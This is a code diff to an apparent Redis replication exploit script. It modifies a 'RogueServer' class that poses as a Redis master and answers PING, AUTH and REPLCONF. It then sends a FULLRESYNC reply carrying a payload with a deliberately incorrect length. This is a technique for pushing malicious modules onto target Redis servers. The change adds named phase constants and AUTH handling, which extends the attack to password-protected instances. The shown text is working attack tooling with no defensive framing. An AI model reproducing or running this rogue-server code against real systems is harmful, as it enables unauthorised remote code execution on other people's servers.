@@ -62,6 +62,13 @@ class Remote:
         buf = self.recv()
         return buf
 
+class RogueServerConst:
+    class PHASE:
+        READY = 0
+        PING = 10
+        AUTH = 20
+        REPLCONF = 30
+        SYNC = 100
 class RogueServer:
     def __init__(self, lhost, lport):
         self._host = lhost
@@ -72,20 +79,23 @@ class RogueServer:
 
     def handle(self, data):
         resp = ""
-        phase = 0
+        phase = RogueServerConst.PHASE.READY
         if "PING" in data:
             resp = "+PONG" + CLRF
-            phase = 1
+            phase = RogueServerConst.PHASE.PING
+        elif "AUTH" in data:
+            resp = "+OK" + CLRF
+            phase = RogueServerConst.PHASE.AUTH
         elif "REPLCONF" in data:
             resp = "+OK" + CLRF
-            phase = 2
+            phase = RogueServerConst.PHASE.REPLCONF
         elif "PSYNC" in data or "SYNC" in data:
             resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
             # send incorrect length
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
             resp += payload + CLRF.encode()
-            phase = 3
+            phase = RogueServerConst.PHASE.SYNC
         return resp, phase
 
     def exp(self):
@@ -96,7 +106,7 @@ class RogueServer:
                 break
             resp, phase = self.handle(data)
             dout(cli, resp)
-            if phase == 3:
+            if phase == RogueServerConst.PHASE.SYNC:
                 break
 
 def interact(remote):
